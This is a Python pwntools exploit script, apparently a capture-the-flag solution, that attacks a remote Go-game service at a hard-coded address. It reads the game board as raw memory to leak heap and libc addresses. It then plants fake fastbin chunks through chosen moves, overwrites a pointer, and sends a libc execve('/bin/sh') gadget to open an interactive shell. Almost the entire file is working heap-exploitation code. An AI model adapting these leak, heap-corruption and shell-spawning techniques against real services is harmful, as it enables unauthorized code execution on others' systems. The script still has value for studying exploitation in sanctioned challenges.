#!/usr/bin/env python
from pwn import *
context.update(arch='amd64', os='linux')
p, u = pack, unpack

conn = remote('52.198.232.90', 31337)

def print_board():
    print '   ABCDEFGHIJKLMNOPQRS'
    for i in xrange(len(board)):
        print '%2d' % i,
        print board[i]
    print

global board
def read_board(debug=False):
    global board
    conn.recvline()
    board = []
    for i in xrange(19):
        board.append(conn.recvline().strip().split()[1])
    conn.recvline()
    conn.recvline()
    if debug:
        print_board()
    return board

num_moves = 0
def move(row, col, debug=False, extra=''):
    global num_moves
    if board[row][col] == 'X':
        return
    num_moves += 1
    c = 'ABCDEFGHIJKLMNOPQRS'[col]
    r = str(19 - row)
    payload = c + r
    payload = payload.ljust(4, '|')
    payload += extra
    conn.sendline(payload)
    if not extra:
        read_board(debug)

def regret(debug=False):
    global num_moves
    num_moves -= 1
    conn.sendline('regret')
    read_board(debug)

def human_move(coord, debug=True):
    row = int(coord[1:])
    col = 'ABCDEFGHIJKLMNOPQRS'.index(coord[0])
    move(row, col, debug)

init_dummy_pos = (0, 0)
def surrender():
    global dummy_pos
    global num_moves
    dummy_pos = init_dummy_pos
    num_moves = 0
    conn.sendline('surrender')
    conn.recvuntil('(y/n)\n')
    conn.sendline('n')
    conn.recvuntil('(y/n)\n')
    conn.sendline('y')

for i in xrange(2):
    read_board()
    surrender()
read_board()

def make_ko(ko):
    r, c = ko[0]
    c -= 2
    # left
    move(r, c)
    move(r - 1, c + 1)
    move(r + 1, c + 1)
    move(r, c + 2)

    # right
    move(r - 1, 19 - (c + 2) - 1)
    move(r + 1, 19 - (c + 2) - 1)
    move(r, 19 - (c + 3) - 1)

KO1 = 0
KO2 = 1
KO3 = 2
KO4 = 3
MOVE = 4
NUM_STATES = 5

kos = [
    (3, 2),
    (3, 6),
    (15, 2),
    (15, 6),
]

init_dummy_pos = (kos[0][0] + 1, 19 - 1)
dummy_pos = init_dummy_pos


KOS = [((i, j), (19 - i - 1, 19 - j)) for i, j in kos]

avoid = []
def dummy_move(debug=False):
    global dummy_pos
    r, c = dummy_pos
    #print r, c
    move(r, c, debug)

    def bad(r, c):
        if board[r + 1][c] == 'O':
            return True
        if c == 19 - 14 - 1:
            return True
        b = (r * 2 * 19 + c * 2) / 8
        if 72 <= b < 80:
            return True
        return board[r][c] != '.'

    while bad(r, c):
        if c == 0:
            r -= 1
            c = 19 - 1
        else:
            c -= 1
    dummy_pos = r, c

def fill_history(count):
    for k in KOS:
        make_ko(k)

    ko_states = {
        KO1: 1,
        KO2: 1,
        KO3: 1,
        KO4: 1,
    }

    state = KO1
    while num_moves < count:
        print num_moves

        if state in ko_states:
            st = ko_states[state]
            r, c = KOS[state][st]
            #print 'ko:', r, c
            move(r, c)
            ko_states[state] = 1 - st

        if state == MOVE:
            #print 'dummy'
            dummy_move()

        state = (state + 1) % NUM_STATES

fill_history(182)

def read8(offset):
    bit_offset = (offset * 8) / 2
    data = ''.join(board)
    result = 0
    for i in xrange(64/2):
        states = '.OX\0'
        val = states.index(data[bit_offset + i])
        result |= val << (i * 2)
    return result

heap_addr = read8(0)
print 'heap_addr =', hex(heap_addr)

# 3nd half-nibble of heap_addr
bit_index = 3

r = bit_index / 19
c = bit_index % 19
move(r, c)

modified_heap_addr = read8(0)
print 'modified_heap_addr =', hex(modified_heap_addr)

regret()

libc_addr = read8(64)
libc_base = libc_addr - 0x3be7b8
print 'libc_base =', hex(libc_base)

execve_binsh = libc_base + 0xe66bd

for i in xrange(3):
    surrender()
    read_board()

def write(byte_offset, half_nibble_offset, value):
    bit_index = byte_offset * 8 / 2
    bit_index += half_nibble_offset
    r = bit_index / 19
    c = bit_index % 19
    if value == 2:
        move(r, c)
    elif value == 1:
        move(19 - r - 1, 19 - c - 1)
    else:
        raise

# place 0x20 for fake fastbin (0x0 -> 0x20)
write(24, 2, 2)

# place 0x20 for next of fake fastbin (0x0 -> 0x20)
write(56, 2, 2)

fill_history(182)
print_board()

# point history to fake fastbin chunk (0x410 -> 0x550)
write(0, 3, 1)
write(0, 4, 1)

heap_addr = read8(0)
print 'heap_addr =', hex(heap_addr)

print_board()

# Change kos to avoid conflicting with write.
kos = [
    (2, 2),
    (2, 6),
    (16, 2),
    (16, 6),
]
init_dummy_pos = (5, 19 - 1)
KOS = [((i, j), (19 - i - 1, 19 - j)) for i, j in kos]

surrender()
read_board()

g_input = 0x609440

val = g_input
half_nibble_offset = 0
while val > 0:
    half_nibble = val & 3
    if half_nibble != 0:
        assert half_nibble != 3
        write(0x20, half_nibble_offset, half_nibble)
    val >>= 2
    half_nibble_offset += 1

print_board()

print 'about to fill history'
#raw_input()
fill_history(182)

#raw_input()
print_board()
move(9, 0, extra=p(execve_binsh))

conn.interactive(prompt='')
